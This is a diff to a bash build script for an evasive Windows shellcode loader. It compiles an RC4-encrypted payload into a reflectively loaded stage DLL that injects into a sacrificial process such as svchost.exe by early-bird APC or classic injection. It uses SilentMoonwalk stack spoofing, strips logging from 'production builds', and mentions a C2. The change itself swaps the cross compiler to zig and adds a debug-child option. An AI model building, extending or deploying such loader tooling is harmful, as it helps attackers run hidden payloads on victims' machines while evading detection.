@@ -36,6 +36,8 @@ FORMAT="service"
 SMW="on"
 VERIFY_MS="5000"
 DEBUG_FLAG=""
+DEBUG_CHILD="0"
+CC_OVERRIDE=""
 
 print_usage() {
   cat <<'EOF'
@@ -54,6 +56,10 @@ options:
                        (default: svchost.exe, e.g. dllhost.exe)
   --process-args <s>   optional args for the sacrificial process
   --arch <x64|x86>     architecture of blob and loader (default: x64)
+  --cc <cmd>           cross compiler command, optionally with arguments
+                       (default: zig cc -target x86_64-windows-gnu, or
+                       zig cc -target x86-windows-gnu for --arch x86;
+                       install zig from https://ziglang.org/download)
   --key <hex>          RC4 key for the shellcode blob as hex; random 16-byte
                        key when omitted
   --inject <apc|ct>    load method: apc = early-bird QueueUserAPC (default),
@@ -65,6 +71,9 @@ options:
                        injection before declaring success (default: 5000)
   --debug              keep verbose diagnostics in the binaries (default: no;
                        production builds compile all logging out)
+  --debug-child        run the sacrificial process as a debuggee so the loader
+                       reports its first exception and exit code (implies
+                       --debug; lab builds only)
 EOF
 }
 
@@ -90,7 +99,7 @@ abspath() {
 
 needs_value() {
   case "$1" in
-  --shellcode | --output | --process | --process-args | --process_args | --arch | --key | --inject | --format | --smw | --verify-ms | --verify_ms)
+  --shellcode | --output | --process | --process-args | --process_args | --arch | --cc | --key | --inject | --format | --smw | --verify-ms | --verify_ms)
     return 0
     ;;
   esac
@@ -105,6 +114,7 @@ set_opt() {
   --process) PROCESS="$val" ;;
   --process-args | --process_args) PROCESS_ARGS="$val" ;;
   --arch) ARCH="$val" ;;
+  --cc) CC_OVERRIDE="$val" ;;
   --key) KEY="$val" ;;
   --inject) INJECT="$val" ;;
   --format) FORMAT="$val" ;;
@@ -116,6 +126,14 @@ set_opt() {
     esac
     ;;
   --verify-ms | --verify_ms) VERIFY_MS="$val" ;;
+  --debug-child | --debug_child)
+    case "$val" in
+    false | 0 | no | "") DEBUG_CHILD="0" ;;
+    *) DEBUG_CHILD="1" ;;
+    esac
+    # the debugger path logs via the DEBUG-gated helpers
+    [[ "$DEBUG_CHILD" == "1" ]] && DEBUG_FLAG="1"
+    ;;
   --debug)
     case "$val" in
     true | 1 | yes) DEBUG_FLAG="1" ;;
@@ -133,6 +151,20 @@ while [[ $# -gt 0 ]]; do
   --help | -h)
     print_usage
     exit 0
+    ;;
+  --debug-child | --debug_child)
+    if [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
+      case "$2" in
+      false | 0 | no | "") DEBUG_CHILD="0" ;;
+      *) DEBUG_CHILD="1" ;;
+      esac
+      shift 1
+    else
+      DEBUG_CHILD="1"
+    fi
+    # the debugger path logs via the DEBUG-gated helpers
+    [[ "$DEBUG_CHILD" == "1" ]] && DEBUG_FLAG="1"
+    shift 1
     ;;
   --debug)
     # boolean-ish flag; may be followed by an explicit value from the C2
@@ -168,15 +200,18 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
-# ---- toolchain selection ----
+# zig is the explicit cross compiler: one pinned toolchain across hosts keeps
+# the generated loader byte-for-byte consistent (the reflective stage is very
+# sensitive to compiler/linker differences, e.g. TLS layout). --cc still
+# overrides it, e.g. to use a mingw-w64 gcc.
 case "$ARCH" in
 x64 | amd64)
-  CC="x86_64-w64-mingw32-gcc"
+  DEFAULT_CC="zig cc -target x86_64-windows-gnu"
   ARCH_SMW_OK=1
   NASM_FORMAT="win64"
   ;;
 x86 | 386)
-  CC="i686-w64-mingw32-gcc"
+  DEFAULT_CC="zig cc -target x86-windows-gnu"
   ARCH_SMW_OK=0
   NASM_FORMAT=""
   ;;
@@ -185,6 +220,15 @@ x86 | 386)
   exit 1
   ;;
 esac
+
+# --cc overrides the default cross compiler. The value may carry arguments
+# (e.g. "zig cc -target x86_64-windows-gnu"), so keep it as an array.
+if [[ -n "$CC_OVERRIDE" ]]; then
+  read -r -a CC_CMD <<<"$CC_OVERRIDE"
+else
+  read -r -a CC_CMD <<<"$DEFAULT_CC"
+fi
+CC="${CC_CMD[0]}"
 
 SMW_FLAG=""
 [[ "$SMW" == on && "$ARCH_SMW_OK" == 1 ]] && SMW_FLAG="-DNTSYS_SMW"
@@ -213,8 +257,8 @@ if [[ -z "$HOSTCC" ]]; then
 fi
 if ! command -v "$CC" >/dev/null 2>&1; then
   echo "[-] missing cross compiler: $CC" >&2
-  echo "    Linux:  apt install gcc-mingw-w64-$( [[ "$ARCH" == x64 ]] && echo x86-64 || echo i686 )" >&2
-  echo "    msys2:  pacman -S mingw-w64-$( [[ "$ARCH" == x64 ]] && echo x86_64 || echo i686 )-gcc" >&2
+  echo "    install zig and put it on PATH (https://ziglang.org/download), or" >&2
+  echo "    pass --cc to use a mingw-w64 gcc instead" >&2
   exit 1
 fi
 if [[ -n "$SMW_FLAG" ]] && ! command -v nasm >/dev/null 2>&1; then
@@ -283,6 +327,7 @@ echo "    smw:       $SMW_DESC"
 echo "    verify:    ${VERIFY_MS} ms"
 echo "    output:    $OUTPUT_ABS"
 echo "    logging:   $([[ -n "$DEBUG_FLAG" ]] && echo 'DEBUG (verbose, keep in binary)' || echo 'none (compiled out)')"
+[[ "$DEBUG_CHILD" == "1" ]] && echo "    child:     debuggee (report first exception + exit code)"
 
 # ---- build in a scratch dir so no artifacts pollute the module tree ----
 BUILDDIR="$(mktemp -d "${TMPDIR:-/tmp}/staged_loader.XXXXXX")"
@@ -312,6 +357,7 @@ esc_c() {
   printf '#define SACRIFICIAL_PROCESS L"%s"\n' "$(esc_c "$PROCESS")"
   printf '#define SACRIFICIAL_ARGS L"%s"\n' "$(esc_c "$PROCESS_ARGS")"
   printf '#define INJECT_VERIFY_MS %s\n' "$VERIFY_MS"
+  printf '#define INJECT_DEBUG_CHILD %s\n' "$DEBUG_CHILD"
   printf '#endif /* STAGED_LOADER_CONFIG_H */\n'
 } >"$BUILDDIR/config.h"
 
@@ -343,20 +389,20 @@ INJECT_FLAG=""
 [[ "$INJECT" == ct ]] && INJECT_FLAG="-DCLASSIC_INJECT"
 
 # ---- build the stage DLL (the real loader, mapped only in memory) ----
-"$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} $INJECT_FLAG $STAGE_SERVICE_FLAG \
+"${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} $INJECT_FLAG $STAGE_SERVICE_FLAG \
   -DUNICODE -D_UNICODE -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 $SMW_FLAG \
   -I. -c loader.c -o loader_stage.o
-"$CC" -O2 -Wall -Wextra $SMW_FLAG -I. -c ntsys.c -o ntsys.o
-"$CC" -O2 -Wall -Wextra -c rc4.c -o rc4.o
+"${CC_CMD[@]}" -O2 -Wall -Wextra $SMW_FLAG -I. -c ntsys.c -o ntsys.o
+"${CC_CMD[@]}" -O2 -Wall -Wextra -c rc4.c -o rc4.o
 STAGE_OBJS="loader_stage.o rc4.o ntsys.o"
 if [[ -n "$SMW_FLAG" ]]; then
-  "$CC" -O2 -Wall -Wextra -I. -c smw/SilentMoonwalk.c -o smw/SilentMoonwalk.o
+  "${CC_CMD[@]}" -O2 -Wall -Wextra -I. -c smw/SilentMoonwalk.c -o smw/SilentMoonwalk.o
   nasm -f "$NASM_FORMAT" smw/DesyncSpoofer.asm -o smw/DesyncSpoofer.o
   STAGE_OBJS="$STAGE_OBJS smw/SilentMoonwalk.o smw/DesyncSpoofer.o"
 fi
 # --dynamicbase keeps the base relocation table; the reflective loader needs
 # it to map the DLL away from its preferred base.
-"$CC" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o stage.dll \
+"${CC_CMD[@]}" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o stage.dll \
   $STAGE_OBJS -ladvapi32 -lshell32
 
 if [[ ! -s stage.dll ]]; then
@@ -404,24 +450,24 @@ SYM(staged_loader_key_start):
 .global SYM(staged_loader_key_end)
 SYM(staged_loader_key_end):
 EOF
-"$CC" -c stage_data.S -o stage_data.o
+"${CC_CMD[@]}" -c stage_data.S -o stage_data.o
 
 # ---- build the host container ----
-"$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -c bootstrap.c -o bootstrap.o
-"$CC" -O2 -Wall -Wextra -c reflect.c -o reflect.o
-"$CC" -O2 -Wall -Wextra -c rc4.c -o rc4_host.o
+"${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -c bootstrap.c -o bootstrap.o
+"${CC_CMD[@]}" -O2 -Wall -Wextra -c reflect.c -o reflect.o
+"${CC_CMD[@]}" -O2 -Wall -Wextra -c rc4.c -o rc4_host.o
 
 HOST_OBJS="bootstrap.o reflect.o rc4_host.o stage_data.o"
 if [[ "$FORMAT" == dll ]]; then
-  "$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -c dllhost.c -o host.o
+  "${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -c dllhost.c -o host.o
   # --dynamicbase lets the DLL relocate when mapped in memory.
-  "$CC" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o loader_out.dll \
+  "${CC_CMD[@]}" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o loader_out.dll \
     host.o $HOST_OBJS -lshell32
   BUILT="loader_out.dll"
 else
-  "$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -DUNICODE -D_UNICODE \
+  "${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -DUNICODE -D_UNICODE \
     -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -c stager.c -o host.o
-  "$CC" -O2 -s -o loader_out.exe host.o $HOST_OBJS -lshell32
+  "${CC_CMD[@]}" -O2 -s -o loader_out.exe host.o $HOST_OBJS -lshell32
   BUILT="loader_out.exe"
 fi
 
